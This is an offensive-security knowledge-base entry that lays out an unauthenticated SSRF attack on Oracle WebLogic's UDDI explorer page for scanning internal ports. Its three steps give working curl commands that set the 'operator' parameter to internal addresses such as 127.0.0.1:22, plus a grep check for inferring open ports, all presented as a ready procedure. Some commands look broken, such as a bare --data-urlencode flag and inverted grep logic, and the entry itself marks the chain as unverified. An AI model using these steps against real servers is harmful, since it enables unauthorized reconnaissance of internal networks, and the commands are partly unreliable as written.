---
tags:
  - ssrf
  - weblogic
  - uddi
  - reconnaissance
  - port-scanning
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
  - Oracle WebLogic
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-WebLogic-UDDI-Endpoint]]'
  - '[[procedures/Exploit-SSRF-via-Operator-Parameter]]'
  - '[[procedures/Infer-Service-Availability-from-Response]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:39:02.489Z'
description: >-
  Unauthenticated SSRF exploitation in Oracle WebLogic Server's UDDI application
  to perform internal network reconnaissance via arbitrary TCP connections.
skill_level: intermediate
impact_level: high
id: 92748c9e-67f3-4a6f-a745-a057093f0b37
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# SSRF in WebLogic UDDI for Internal Port Scanning and Reconnaissance

Multi-stage attack chain demonstrating exploitation of a Server-Side Request Forgery vulnerability in the publicly accessible UDDI application on Oracle WebLogic Server. This allows unauthenticated attackers to force the server into making arbitrary TCP connections, enabling reconnaissance of internal services and ports through verbose error responses.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access UDDI Endpoint] --> B[Trigger SSRF with Operator Parameter]
    B --> C[Analyze Response for Recon]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- Browser or [[commands/curl-http-request]]

### Target Environment

- Oracle WebLogic Server with exposed UDDI application
- Required services/ports: TCP ports 80 or arbitrary internal ports
- Network access requirements: Public internet access to the WebLogic server

### Initial Access Requirements

- No credentials required (unauthenticated)
- External network position
- No prior access needed

## Detailed Attack Procedures

### Step 1: Access UDDI Endpoint
procedure: [[procedures/Access-WebLogic-UDDI-Endpoint]]

**Objective**: Identify and access the publicly exposed UDDI SearchPublicRegistries.jsp page to confirm vulnerability presence.

**Instructions**: Navigate to the UDDI endpoint using a browser or [[commands/curl-http-request]] to fetch the initial page:

```bash
curl "http://target-server/uddiexplorer/SearchPublicRegistries.jsp"
```

**Expected Output**: HTML response rendering the UDDI search form, indicating the endpoint is accessible without authentication.

**Success Indicators**:
- Page loads successfully with search parameters visible
- No authentication prompt

### Step 2: Trigger SSRF Exploitation
procedure: [[procedures/Exploit-SSRF-via-Operator-Parameter]]

**Objective**: Manipulate the 'operator' parameter to force the server to connect to an arbitrary internal host and port.

**Instructions**: Submit a request with the 'operator' parameter set to a target like http://127.0.0.1:80, combined with dummy search parameters, using [[commands/curl-ssrf-trigger]]:

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" \
  -d "operator=http://127.0.0.1:80" \
  -d "rdoSearch=name" \
  -d "txtSearchname=sdf" \
  -d "rdoSearch=business" \
  -d "txtSearchbusiness=sdf" \
  --data-urlencode
```

**Expected Output**: Server response attempting to connect to the specified host:port, potentially with error details.

**Success Indicators**:
- Request completes without client-side errors
- Response includes server-side connection attempt indicators

### Step 3: Analyze Response for Reconnaissance
procedure: [[procedures/Infer-Service-Availability-from-Response]]

**Objective**: Parse the verbose response to determine if services are listening on targeted ports, enabling port scanning.

**Instructions**: Review the response from the SSRF trigger using tools like grep or manual inspection after executing the previous curl command. For automation, pipe output through [[commands/curl-ssrf-trigger]] and grep for connection errors:

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" \
  -d "operator=http://127.0.0.1:22" \
  -d "rdoSearch=name" \
  -d "txtSearchname=sdf" | grep -i "connection" || echo "Port open"
```

**Expected Output**: Differences in response based on port status, e.g., connection refused for closed ports vs. timeouts or successes for open ones.

**Success Indicators**:
- Verbose errors revealing internal service details
- Ability to distinguish open vs. closed ports

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to UDDI endpoint
2. Forced arbitrary TCP connections for internal scanning
3. Reconnaissance of internal network services via response analysis

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Active Scanning]] Active Scanning

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Reconnaissance]] Reconnaissance

---
*Last updated: 2023-10-01T00:00:00Z*
